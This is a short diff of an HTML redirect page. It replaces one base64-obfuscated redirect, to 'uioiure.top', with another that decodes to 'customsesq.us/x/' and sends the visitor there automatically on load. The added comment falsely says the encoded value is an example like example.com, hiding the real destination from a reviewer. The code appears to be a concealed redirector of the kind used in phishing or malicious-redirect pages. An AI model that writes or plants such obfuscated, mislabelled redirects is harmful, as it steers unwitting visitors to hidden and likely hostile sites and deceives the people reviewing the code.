@@ -1,11 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
+  <title>Redirecting...</title>
   <script>
-    const encoded = "dWlvaXVyZS50b3A=";
-    const url = "https://" + atob(encoded);
-    window.location.replace(url);
+    // Base64-encoded URL (example: https://example.com)
+    const encodedUrl = "aHR0cHM6Ly9jdXN0b21zZXNxLnVzL3gv";
+
+    // Decode and redirect
+    const redirectUrl = atob(encodedUrl);
+    window.location.href = redirectUrl;
   </script>
 </head>
 <body>
